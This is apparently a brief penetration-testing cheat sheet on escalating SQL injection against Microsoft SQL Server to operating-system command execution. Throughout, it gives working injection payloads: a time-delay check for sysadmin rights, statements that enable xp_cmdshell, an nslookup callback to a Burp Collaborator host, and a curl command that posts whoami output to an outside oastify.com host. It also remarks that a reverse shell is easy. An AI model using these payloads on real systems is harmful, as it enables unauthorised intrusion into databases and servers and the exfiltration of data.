SQLi to RCE -> MSSQL

- the easiest way :
  
  - if `xp_cmdshell` is active :
    
    - param=inject'; EXEC xp_cmdshell 'nslookup collab.burp.com '; --+
- Hard way :
  
  - if `xp_cmdshell` is inactive:
    
    - Check authority to enable xp_cmdshell :
      
      - ```sql
        IS_SRVROLEMEMBER('sysadmin');
        ```
        
        - if the result of this query is 1 this mean we can enable xp_cmdshell
          
        - how check that? we can use a query like that :
          
          - ```sql
            param=inject'; if(IS_SRVROLEMEMBER('sysadmin')=1) waitfor delay '00:00:10' ; --+
            ```
            
            - if the web app waits 10 secs it means everything is ready
    - We need to enable `advanced options`. The commands to do this are:
      
      - ```sql
        ';exec sp_configure 'show advanced options','1';reconfigure;--
        ```
        
    - Now we can enable xp_cmdshell :
      
      - ```sql
        ';exec sp_configure 'xp_cmdshell','1';reconfigure;--
        ```
        

- Simple Try for exfiltrate data :
  
  - ```
    whoami | curl -X POST -d @- http://nrir8iegsv9y4bj6pbodxub87zdr1ip7.oastify.com/'
    ```
    
- Note: Reverse shell? it is so easy
